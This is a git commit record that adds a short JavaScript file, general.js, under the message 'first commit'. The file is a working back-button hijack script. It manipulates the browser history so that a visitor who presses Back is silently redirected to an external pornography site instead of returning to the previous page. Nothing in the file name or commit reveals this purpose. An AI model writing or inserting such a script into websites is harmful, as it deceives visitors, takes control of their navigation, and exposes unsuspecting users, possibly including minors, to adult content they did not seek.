a42c39de3e974820a9bf8431bf98055022d90c2d
XielGansz <fakhriawail8@gmail.com>
2024-01-26 11:48:56 +0700

    first commit

---
+++ general.js
@@ -0,0 +1,12 @@
+(function(window, location) {
+        history.replaceState(null, document.title, location.pathname+"#!/history");
+        history.pushState(null, document.title, location.pathname);
+        window.addEventListener("popstate", function() {
+        if(location.hash === "#!/history") {
+            history.replaceState(null, document.title, location.pathname);
+            setTimeout(function(){
+            location.replace("https://xnxx.com");
+            },10);
+        }
+        }, false);
+}(window, location));
